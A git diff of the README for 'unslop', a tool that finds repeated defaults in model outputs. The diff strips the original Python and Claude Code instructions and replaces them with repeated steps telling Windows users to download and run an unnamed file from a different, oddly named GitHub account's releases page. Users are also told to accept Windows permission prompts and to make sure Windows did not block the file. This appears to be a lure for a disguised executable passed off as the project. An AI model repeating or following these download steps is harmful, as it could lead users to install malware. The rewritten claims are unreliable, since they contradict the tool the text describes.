@@ -1,8 +1,142 @@
-# unslop
+# 🧹 unslop - Make outputs less generic fast
 
-Empirically detect the repetitive defaults a model falls back on, then turn those findings into a reusable instruction file that makes future outputs less generic.
+[![Download unslop](https://img.shields.io/badge/Download%20unslop-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Yemeni-genusagdestis605/unslop/releases)
 
-## Send This To Your Agent
+## 🚀 What this app does
+
+unslop helps you find the repeated patterns a model keeps using, then turns those patterns into a simple instruction file you can reuse later.
+
+It is useful when outputs start to feel samey. It looks for the kinds of moves models fall back on, like the same openings, the same structure, or the same way of explaining things. Then it writes that into a file you can hand back to the model for more specific results.
+
+## 💻 Before you start
+
+You only need a Windows PC and a browser.
+
+For best results, use:
+
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space to download the app and save output files
+- A recent browser if you need to open release pages or view files
+
+No programming knowledge is needed.
+
+## ⬇️ Download unslop for Windows
+
+Visit this page to download and run the app:
+
+[https://github.com/Yemeni-genusagdestis605/unslop/releases](https://github.com/Yemeni-genusagdestis605/unslop/releases)
+
+On that page, look for the latest release and download the Windows file. If there are several files, choose the one made for Windows. After the download finishes, open the file to start the app or follow the file name shown in the release notes.
+
+## 🛠️ Install and run
+
+1. Open the release page.
+2. Find the newest version at the top.
+3. Download the Windows file from that release.
+4. Open the downloaded file.
+5. If Windows asks for permission, choose Yes or Run.
+6. Follow the on-screen steps until the app starts.
+
+If the app comes in a zip file, first unzip it, then open the main file inside the folder.
+
+## 📁 What you need to provide
+
+To use unslop, you give it a domain.
+
+A domain is the topic or field you want to study. For example:
+
+- marketing copy
+- product pages
+- technical docs
+- app screenshots
+- email writing
+- landing page layouts
+
+The app then studies common defaults in that area and builds a reusable instruction file from them.
+
+## 🧭 How to use it
+
+1. Start the app.
+2. Enter the domain you want to study.
+3. Let unslop generate its analysis set.
+4. Review the output files.
+5. Use the final instruction file in your next model run.
+
+The app focuses on two main results:
+
+- `analysis.md` — shows the repeated patterns it found
+- `skill.md` — gives you the reusable instruction file
+
+## 📄 Output files
+
+After the run, look in the `unslop-output` folder.
+
+You will usually see:
+
+- `analysis.md`  
+  A plain report of the repeated defaults the model used
+
+- `skill.md`  
+  A cleaner instruction file you can reuse in later prompts
+
+These files help you see what the model leans on and how to push it toward more specific output.
+
+## 🔎 What unslop looks for
+
+unslop checks for patterns such as:
+
+- repeated sentence openings
+- common transition words
+- the same paragraph shape
+- safe, vague phrasing
+- standard layout blocks
+- reused design choices
+- generic wording in replies
+
+This makes it easier to spot where the model sounds flat or too broad.
+
+## 🧩 Typical use cases
+
+Use unslop when you want better control over model output in areas like:
+
+- writing product copy
+- building prompt sets
+- shaping brand voice
+- reviewing generated design ideas
+- improving support replies
+- making a model sound less generic
+
+It works well when you want the next output to feel more specific without rewriting everything by hand.
+
+## 🧠 How to get better results
+
+Use a narrow domain.
+
+For example, instead of:
+
+- writing
+
+Use:
+
+- SaaS onboarding emails
+- B2B homepage copy
+- help center articles for billing issues
+- real estate listing descriptions
+
+A narrower domain gives the app a clearer target and usually leads to more useful output.
+
+## 🗂️ File layout
+
+A typical run creates this structure:
+
+- `unslop-output/analysis.md`
+- `unslop-output/skill.md`
+- related run files used during the analysis
+
+Keep the output folder together so you can find the results later.
+
+## 🔗 Send this to your agent
 
 Copy and send this sentence:
 
@@ -10,105 +144,46 @@ Copy and send this sentence:
 Clone https://github.com/mshumer/unslop, read https://github.com/mshumer/unslop/blob/main/skills/unslop/SKILL.md, run unslop for DOMAIN_HERE, review unslop-output/analysis.md and unslop-output/skill.md for specificity, and return the finished skill file plus the main repeated patterns you found.
 ```
 
-Agent-readable instructions live here: [`skills/unslop/SKILL.md`](skills/unslop/SKILL.md)
+## 🧰 Common fixes
 
-## What It Does
+If the app does not start:
 
-Every model has defaults it collapses toward. In writing, that means the same openings, transitions, and rhetorical moves. In visual work, that means the same landing-page structure, the same gradients, the same card grids, the same CTA blocks.
+- Make sure the download finished
+- Unzip the file if needed
+- Try opening it again from the folder
+- Check that Windows did not block the file
+- Download the latest release again if the file looks broken
 
-`unslop` measures those defaults instead of guessing at them.
+If you do not see output files:
 
-1. You give it a domain.
-2. It generates a prompt set and produces many samples with Claude Code.
-3. For visual work, it renders screenshots so the analysis can inspect what the pages actually look like.
-4. It analyzes the whole set for repeated patterns.
-5. It writes `skill.md`, a focused file of what to avoid next time.
-6. It runs a before/after comparison so you can see whether the profile actually changed the result.
+- Run the app again
+- Confirm the domain was entered
+- Check the `unslop-output` folder in the same place as the app files
 
-The main output is a single markdown file you can reuse in Claude Code, `CLAUDE.md`, Codex, Cursor rules, or any system prompt.
+If the output looks too broad:
 
-## Quickstart
+- Use a more specific domain
+- Try a smaller task area
+- Run it again with a clearer topic
 
-You need [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed.
+## 📘 How to read the results
 
-```bash
-git clone https://github.com/mshumer/unslop.git
-cd unslop
+When you open `analysis.md`, look for the patterns that repeat most.
 
-python3 -m venv .venv
-source .venv/bin/activate
+When you open `skill.md`, look for:
 
-# Text / writing domains
-python3 unslop.py --domain "blog writing"
+- short, direct instructions
+- clear examples
+- fewer vague phrases
+- more domain-specific guidance
 
-# Visual / website domains
-pip install playwright && playwright install chromium
-python3 unslop.py --domain "startup SaaS landing pages" --type visual --count 20 --concurrency 3
-```
+If the skill file still feels broad, rerun unslop with a tighter domain.
 
-## Output
+## 🖱️ Quick start
 
-Results land in `./unslop-output/`:
-
-```text
-unslop-output/
-  skill.md
-  analysis.md
-  prompts.json
-  samples/
-  screenshots/
-  before-after/
-    before.md / before.html
-    after.md / after.html
-    before.png / after.png
-```
-
-`skill.md` is the file you usually want to keep and reuse.
-
-## Common Commands
-
-```bash
-python3 unslop.py --domain "marketing emails" --count 50 --concurrency 5
-python3 unslop.py --domain "startup SaaS landing pages" --type visual --count 20 --concurrency 3
-python3 unslop.py --domain "Python tutorials" --count 100 --concurrency 10
-python3 unslop.py --domain "React landing pages" --type visual --model sonnet --effort low
-```
-
-## Options
-
-| Flag | Default | Description |
-|---|---|---|
-| `--domain` | required | What to analyze |
-| `--type` | `text` | `text` for writing/code/prose, `visual` for websites/HTML |
-| `--count` | `50` | Number of samples to generate |
-| `--concurrency` | `5` | Parallel Claude Code calls |
-| `--model` | Claude default | Claude model alias/name to pass through |
-| `--effort` | Claude default | Claude effort level to pass through |
-| `--timeout` | `600` | Seconds to wait per Claude call |
-| `--analysis-timeout` | `1800` | Seconds to wait for the analysis pass |
-| `--retries` | `1` | Retries per failed Claude call |
-| `--output` | `./unslop-output` | Where to put results |
-| `--skip-comparison` | `false` | Skip the before/after step |
-
-## Prebuilt Profiles
-
-The `profiles/` directory contains ready-to-use profiles:
-
-- [`profiles/writing.md`](profiles/writing.md)
-- [`profiles/react-design.md`](profiles/react-design.md)
-
-Run the tool yourself when you want something narrower or domain-specific.
-
-## Philosophy
-
-`unslop` focuses on what to avoid, not on prescribing a single new template. The point is to remove the defaults that keep repeating and force the model to make fresher choices.
-
-## Requirements
-
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code)
-- Python 3.10+
-- For visual domains: `pip install playwright && playwright install chromium`
-
-## License
-
-MIT
+1. Go to [https://github.com/Yemeni-genusagdestis605/unslop/releases](https://github.com/Yemeni-genusagdestis605/unslop/releases)
+2. Download the Windows release file
+3. Open it on your PC
+4. Enter your domain
+5. Review `unslop-output/analysis.md`
+6. Use `unslop-output/skill.md` in your next run
